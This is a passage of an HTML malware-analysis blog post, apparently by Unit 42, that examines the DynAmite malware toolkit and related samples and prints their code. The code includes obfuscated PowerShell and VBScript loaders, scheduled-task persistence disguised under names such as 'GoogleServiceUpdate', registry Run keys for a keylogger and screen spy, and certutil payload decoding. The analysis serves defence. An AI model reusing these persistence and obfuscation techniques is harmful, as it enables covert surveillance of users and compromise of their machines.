class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">=</span><span class="crayon-v">get</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">tmpfile</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">out</span><span class="crayon-o">-</span><span class="crayon-t">string</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c98d038102979-21">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98d038102979-22"><span class="crayon-sy">$</span><span class="crayon-v">pscode_b64</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">pscode_b64</span><span class="crayon-sy">.</span><span class="crayon-e">trim</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c98d038102979-23">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98d038102979-24"><span class="crayon-sy">$</span><span class="crayon-v">pscode</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Text</span><span class="crayon-sy">.</span><span class="crayon-v">Encoding</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-v">Unicode</span><span class="crayon-sy">.</span><span class="crayon-e">GetString</span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Convert</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-e">FromBase64String</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">pscode_b64</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60a9b96a2c98d038102979-25">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98d038102979-26"><span class="crayon-sy">$</span><span class="crayon-v">id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-t">string</span><span class="crayon-sy">]</span><span class="crayon-sy">(</span><span class="crayon-v">get</span><span class="crayon-o">-</span><span class="crayon-v">random</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">min</span><span class="crayon-h"> </span><span class="crayon-cn">10000</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">max</span><span class="crayon-h"> </span><span class="crayon-cn">100000</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60a9b96a2c98d038102979-27">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98d038102979-28"><span class="crayon-sy">$</span><span class="crayon-v">pscode</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">pscode</span><span class="crayon-sy">.</span><span class="crayon-e">replace</span><span class="crayon-sy">(</span><span class="crayon-s">'#id#'</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-v">id</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c98d038102979-29">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98d038102979-30"><span class="crayon-v">set</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-h"> </span><span class="crayon-s">"$path\mc.ps1"</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">pscode</span></div><div class="crayon-line" id="crayon-60a9b96a2c98d038102979-31">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98d038102979-32"><span class="crayon-sy">$</span><span class="crayon-v">taskstr</span><span class="crayon-o">=</span><span class="crayon-s">"schtasks /create /F /sc minute /mo 2 /tn "</span><span class="crayon-s">"GoogleServiceUpdate"</span><span class="crayon-s">" /tr "</span><span class="crayon-s">"\""</span><span class="crayon-sy">$</span><span class="crayon-i">fileout</span><span class="crayon-s">""</span><span class="crayon-sy">\</span>"<span class="crayon-s">"&nbsp;&nbsp; "</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c98d038102979-33">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98d038102979-34"><span class="crayon-i">iex</span><span class="crayon-h"> </span><span class="crayon-s">'cmd /c $taskstr'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b96a2c98d038102979-35"><span class="crayon-sy">{</span><span class="crayon-sy">{</span><span class="crayon-v">CODE</span><span class="crayon-sy">}</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98d038102979-36">&nbsp;</div><div class="crayon-line" id="crayon-60a9b96a2c98d038102979-37"><span class="crayon-e">The</span><span class="crayon-h"> </span><span class="crayon-e">base64</span><span class="crayon-h"> </span><span class="crayon-e">decoded</span><span class="crayon-h"> </span><span class="crayon-e">VBScript</span><span class="crayon-h"> </span>–</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98d038102979-38">&nbsp;</div><div class="crayon-line" id="crayon-60a9b96a2c98d038102979-39"><span class="crayon-sy">{</span><span class="crayon-sy">{</span><span class="crayon-v">CODE</span><span class="crayon-sy">}</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98d038102979-40"><span class="crayon-e">set </span><span class="crayon-v">wss</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">CreateObject</span><span class="crayon-sy">(</span><span class="crayon-s">"WScript.Shell"</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60a9b96a2c98d038102979-41"><span class="crayon-v">str</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"power"</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">amp</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-s">"sh"</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">amp</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-s">"ell"</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">amp</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-s">".e"</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">amp</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-s">"xe -NoP -sta -NonI -e"</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">amp</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-s">"xe"</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">amp</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-s">"c byp"</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">amp</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-s">"as"</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">amp</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-s">"s -fi"</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">amp</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-s">"le "</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98d038102979-42"><span class="crayon-v">path</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"#dpath#"</span></div><div class="crayon-line" id="crayon-60a9b96a2c98d038102979-43"><span class="crayon-v">str</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">str</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">path</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"\mc.ps1"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98d038102979-44"><span class="crayon-v">wss</span><span class="crayon-sy">.</span><span class="crayon-e">Run </span><span class="crayon-v">str</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0020 seconds] -->
<p><strong>DynAmite Launcher (6 Samples – 0.15% Coverage),</strong></p>
<p><strong>DynAmite KL (1 Sample – 0.02% Coverage)</strong></p>
<p>DynAmite is a “Malware Creation Toolkit” which comes with your standard capabilities that one comes to expect with such a tool.</p>
<p><img class="alignnone size-full wp-image-25161" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/DynAmiteKL.png" alt="dynamitekl" width="899" height="364" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/DynAmiteKL.png 899w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/DynAmiteKL-300x121.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/DynAmiteKL-768x311.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/DynAmiteKL-370x150.png 370w" sizes="(max-width: 899px) 100vw, 899px" /></p>
<p>It does give you the ability to mix and match the features you want and generates a PE wrapper that carries out the selected tasks, usually by simply executing PowerShell commands. The majority of code that I saw generated by this kit was taken from public tools but used swapped around variable names and locations.</p>
<p>The “DynAmite Launcher” variant covers the persistence aspect, which is established through creating Scheduled Tasks. Below are three different iterations of this, most likely from different versions and configurations.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c98f496664713" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
schtasks.exe /create /TN "Microsoft\Windows\DynAmite\Backdoor" /XML C:\Windows\Temp\task.xml
schtasks.exe /create /TN "Microsoft\Windows\DynAmite\Keylogger" /XML C:\Windows\Temp\task2.xml
SCHTASKS /run /TN "Microsoft\Windows\DynAmite\Backdoor"
SCHTASKS /run /TN "Microsoft\Windows\DynAmite\Keylogger"
Remove-Item "C:\Windows\Temp\*.xml"</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c98f496664713-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98f496664713-2">2</div><div class="crayon-num" data-line="crayon-60a9b96a2c98f496664713-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c98f496664713-4">4</div><div class="crayon-num" data-line="crayon-60a9b96a2c98f496664713-5">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c98f496664713-1"><span class="crayon-v">schtasks</span><span class="crayon-sy">.</span><span class="crayon-v">exe</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">create</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">TN</span><span class="crayon-h"> </span><span class="crayon-s">"Microsoft\Windows\DynAmite\Backdoor"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">XML</span><span class="crayon-h"> </span><span class="crayon-v">C</span><span class="crayon-o">:</span><span class="crayon-sy">\</span><span class="crayon-v">Windows</span><span class="crayon-sy">\</span><span class="crayon-v">Temp</span><span class="crayon-sy">\</span><span class="crayon-v">task</span><span class="crayon-sy">.</span><span class="crayon-e">xml</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98f496664713-2"><span class="crayon-v">schtasks</span><span class="crayon-sy">.</span><span class="crayon-v">exe</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">create</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">TN</span><span class="crayon-h"> </span><span class="crayon-s">"Microsoft\Windows\DynAmite\Keylogger"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">XML</span><span class="crayon-h"> </span><span class="crayon-v">C</span><span class="crayon-o">:</span><span class="crayon-sy">\</span><span class="crayon-v">Windows</span><span class="crayon-sy">\</span><span class="crayon-v">Temp</span><span class="crayon-sy">\</span><span class="crayon-v">task2</span><span class="crayon-sy">.</span><span class="crayon-e">xml</span></div><div class="crayon-line" id="crayon-60a9b96a2c98f496664713-3"><span class="crayon-v">SCHTASKS</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">run</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">TN</span><span class="crayon-h"> </span><span class="crayon-s">"Microsoft\Windows\DynAmite\Backdoor"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c98f496664713-4"><span class="crayon-v">SCHTASKS</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">run</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">TN</span><span class="crayon-h"> </span><span class="crayon-s">"Microsoft\Windows\DynAmite\Keylogger"</span></div><div class="crayon-line" id="crayon-60a9b96a2c98f496664713-5"><span class="crayon-v">Remove</span><span class="crayon-o">-</span><span class="crayon-i">Item</span><span class="crayon-h"> </span><span class="crayon-s">"C:\Windows\Temp\*.xml"</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c992849552078" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
#create backdoor task
schtasks.exe /create /TN "Microsoft\Windows\DynAmite\DynAmite" /XML C:\Windows\Temp\dynatask.xml
#create upload task
schtasks.exe /create /TN "Microsoft\Windows\DynAmite\Uploader" /XML C:\Windows\Temp\upltask.xml
#run backdoor task
SCHTASKS /run /TN "Microsoft\Windows\DynAmite\DynAmite"
#create registry entries for keylogger and screenspy
New-ItemProperty -path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name Keylogger -PropertyType String -Value "C:\Windows\dynakey.exe"
New-ItemProperty -path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name ScreenSpy -PropertyType String -Value "C:\Windows\dynascr.exe"
#run keylogger and screenspy
C:\Windows\dynakey.exe
C:\Windows\dynascr.exe
#cleanup temp folder
Remove-Item "C:\Windows\Temp\*"</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c992849552078-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c992849552078-2">2</div><div class="crayon-num" data-line="crayon-60a9b96a2c992849552078-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c992849552078-4">4</div><div class="crayon-num" data-line="crayon-60a9b96a2c992849552078-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c992849552078-6">6</div><div class="crayon-num" data-line="crayon-60a9b96a2c992849552078-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c992849552078-8">8</div><div class="crayon-num" data-line="crayon-60a9b96a2c992849552078-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c992849552078-10">10</div><div class="crayon-num" data-line="crayon-60a9b96a2c992849552078-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c992849552078-12">12</div><div class="crayon-num" data-line="crayon-60a9b96a2c992849552078-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c992849552078-14">14</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c992849552078-1"><span class="crayon-p">#create backdoor task</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c992849552078-2"><span class="crayon-v">schtasks</span><span class="crayon-sy">.</span><span class="crayon-v">exe</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">create</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">TN</span><span class="crayon-h"> </span><span class="crayon-s">"Microsoft\Windows\DynAmite\DynAmite"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">XML</span><span class="crayon-h"> </span><span class="crayon-v">C</span><span class="crayon-o">:</span><span class="crayon-sy">\</span><span class="crayon-v">Windows</span><span class="crayon-sy">\</span><span class="crayon-v">Temp</span><span class="crayon-sy">\</span><span class="crayon-v">dynatask</span><span class="crayon-sy">.</span><span class="crayon-v">xml</span></div><div class="crayon-line" id="crayon-60a9b96a2c992849552078-3"><span class="crayon-p">#create upload task</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c992849552078-4"><span class="crayon-v">schtasks</span><span class="crayon-sy">.</span><span class="crayon-v">exe</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">create</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">TN</span><span class="crayon-h"> </span><span class="crayon-s">"Microsoft\Windows\DynAmite\Uploader"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">XML</span><span class="crayon-h"> </span><span class="crayon-v">C</span><span class="crayon-o">:</span><span class="crayon-sy">\</span><span class="crayon-v">Windows</span><span class="crayon-sy">\</span><span class="crayon-v">Temp</span><span class="crayon-sy">\</span><span class="crayon-v">upltask</span><span class="crayon-sy">.</span><span class="crayon-v">xml</span></div><div class="crayon-line" id="crayon-60a9b96a2c992849552078-5"><span class="crayon-p">#run backdoor task</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c992849552078-6"><span class="crayon-v">SCHTASKS</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">run</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">TN</span><span class="crayon-h"> </span><span class="crayon-s">"Microsoft\Windows\DynAmite\DynAmite"</span></div><div class="crayon-line" id="crayon-60a9b96a2c992849552078-7"><span class="crayon-p">#create registry entries for keylogger and screenspy</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c992849552078-8"><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-v">ItemProperty</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">path </span><span class="crayon-v">HKLM</span><span class="crayon-o">:</span><span class="crayon-sy">\</span><span class="crayon-v">SOFTWARE</span><span class="crayon-sy">\</span><span class="crayon-v">Microsoft</span><span class="crayon-sy">\</span><span class="crayon-v">Windows</span><span class="crayon-sy">\</span><span class="crayon-v">CurrentVersion</span><span class="crayon-sy">\</span><span class="crayon-v">Run</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">Name </span><span class="crayon-v">Keylogger</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">PropertyType </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Value</span><span class="crayon-h"> </span><span class="crayon-s">"C:\Windows\dynakey.exe"</span></div><div class="crayon-line" id="crayon-60a9b96a2c992849552078-9"><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-v">ItemProperty</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">path </span><span class="crayon-v">HKLM</span><span class="crayon-o">:</span><span class="crayon-sy">\</span><span class="crayon-v">SOFTWARE</span><span class="crayon-sy">\</span><span class="crayon-v">Microsoft</span><span class="crayon-sy">\</span><span class="crayon-v">Windows</span><span class="crayon-sy">\</span><span class="crayon-v">CurrentVersion</span><span class="crayon-sy">\</span><span class="crayon-v">Run</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">Name </span><span class="crayon-v">ScreenSpy</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">PropertyType </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Value</span><span class="crayon-h"> </span><span class="crayon-s">"C:\Windows\dynascr.exe"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c992849552078-10"><span class="crayon-p">#run keylogger and screenspy</span></div><div class="crayon-line" id="crayon-60a9b96a2c992849552078-11"><span class="crayon-v">C</span><span class="crayon-o">:</span><span class="crayon-sy">\</span><span class="crayon-v">Windows</span><span class="crayon-sy">\</span><span class="crayon-v">dynakey</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c992849552078-12"><span class="crayon-v">C</span><span class="crayon-o">:</span><span class="crayon-sy">\</span><span class="crayon-v">Windows</span><span class="crayon-sy">\</span><span class="crayon-v">dynascr</span><span class="crayon-sy">.</span><span class="crayon-v">exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c992849552078-13"><span class="crayon-p">#cleanup temp folder</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c992849552078-14"><span class="crayon-v">Remove</span><span class="crayon-o">-</span><span class="crayon-i">Item</span><span class="crayon-h"> </span><span class="crayon-s">"C:\Windows\Temp\*"</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0010 seconds] -->
<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c993771932205" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$loot = ($env:LOCALAPPDATA + "\dyna\"); md $loot
certutil -decode res.crt ($loot + "res"); certutil -decode kl.crt ($loot + "kl.exe"); certutil -decode st.crt ($loot + "st.exe");  certutil -decode cry.crt ($loot + "cry.exe"); certutil -decode t1.crt ($env:TEMP + "\t1.xml"); certutil -decode t2.crt ($env:TEMP + "\t2.xml"); certutil -decode t3.crt ($env:TEMP + "\t3.xml"); certutil -decode t4.crt ($env:TEMP + "\t4.xml"); certutil -decode t5.crt ($env:TEMP + "\t5.xml"); certutil -decode bd.crt C:\ProgramData\bd.exe
schtasks.exe /create /TN "Microsoft\Windows\Windows Printer Manager\1" /XML ($env:TEMP + "\t1.xml")
schtasks.exe /create /TN "Microsoft\Windows\Windows Printer Manager\2" /XML ($env:TEMP + "\t2.xml")
schtasks.exe /create /TN "Microsoft\Windows\Windows Printer Manager\3" /XML ($env:TEMP + "\t3.xml")
schtasks.exe /create /TN "Microsoft\Windows\Windows Printer Manager\4" /XML ($env:TEMP + "\t4.xml")
schtasks.exe /create /TN "Microsoft\Windows\Windows Printer Manager\5" /XML ($env:TEMP + "\t5.xml")
schtasks.exe /run /TN "Microsoft\Windows\Windows Printer Manager\1"
schtasks.exe /run /TN "Microsoft\Windows\Windows Printer Manager\2"
schtasks.exe /run /TN "Microsoft\Windows\Windows Printer Manager\3"
schtasks.exe /run /TN "Microsoft\Windows\Windows Printer Manager\4"
schtasks.exe /run /TN "Microsoft\Windows\Windows Printer Manager\5"
Remove-Item ($env:TEMP + "\*.xml") -Recurse –Force</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c993771932205-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c993771932205-2">2</div><div class="crayon-num" data-line="crayon-60a9b96a2c993771932205-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c993771932205-4">4</div><div class="crayon-num" data-line="crayon-60a9b96a2c993771932205-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c993771932205-6">6</div><div class="crayon-num" data-line="crayon-60a9b96a2c993771932205-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c993771932205-8">8</div><div class="crayon-num" data-line="crayon-60a9b96a2c993771932205-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c993771932205-10">10</div><div class="crayon-num" data-line="crayon-60a9b96a2c993771932205-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c993771932205-12">12</div><div class="crayon-num" data-line="crayon-60a9b96a2c993771932205-13">13</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c993771932205-1"><span class="crayon-sy">$</span><span class="crayon-v">loot</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">env</span><span class="crayon-o">:</span><span class="crayon-v">LOCALAPPDATA</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"\dyna\"); md $loot</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c993771932205-2"><span class="crayon-s">certutil -decode res.crt ($loot + "</span><span class="crayon-i">res</span><span class="crayon-s">"); certutil -decode kl.crt ($loot + "</span><span class="crayon-v">kl</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-s">"); certutil -decode st.crt ($loot + "</span><span class="crayon-v">st</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-s">");&nbsp;&nbsp;certutil -decode cry.crt 